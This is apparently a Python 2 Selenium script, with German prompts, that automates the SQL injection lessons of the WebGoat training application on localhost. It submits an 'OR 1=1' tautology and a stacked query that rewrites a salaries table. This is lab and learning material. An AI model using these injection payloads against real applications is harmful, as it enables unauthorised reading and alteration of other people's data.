from selenium import webdriver
#import pykeyboard
import time


sql =["David' OR '1'='1","'; UPDATE salaries SET salary=99999 WHERE userid='jsmith"]

dec = raw_input("Welche SQL-String? \n 1 = {0} \n 2 = {1} \n Number:".format(sql[0],sql[1]))
dec = int(dec) -1
sqlCom = sql[int(dec)]

form =["String SQL Injection","Modify Data with SQL Injection","Add Data with SQL Injection"]

opt = raw_input("Welche Form? \n 1 = {0} \n 2 = {1} \n 3 = {2} \n Number:".format(form[0],form[1],form[2])) 

opt = int(opt) -1
optCom = form[int(opt)]



def wait():

	time.sleep(0.5)

url = "http://guest:guest@127.0.0.1/webgoat/attack"

dr = webdriver.Firefox()

print "Opening WebGoat: {0} \n".format(url)
dr.get(url)
wait()
#k = pykeyboard.PyKeyboard()
#k.type_string('user')
print "Opening 'String SQL Injection' Lesson \n"

dr.find_element_by_name("start").submit()
wait()
dr.find_element_by_link_text("Injection Flaws").click()
wait()
dr.find_element_by_link_text(optCom).click()
wait()

def injectSQL(driver,sql):
	driver.find_element_by_link_text("Restart this Lesson").click()
	wait()
	
	inp = driver.find_element_by_name("userid")
	inp.send_keys(sql)
	inp.submit()
	wait()

	try:
		result_table = driver.find_element_by_name("form").find_element_by_name("table")
	except Exception, e:
		return 0
	else:
		return len(result_table.find_elements_by_tag_name("tr"))


print "Injecting SQL: {0}".format(sqlCom)
print "Got %s rows..."%injectSQL(dr,sqlCom)
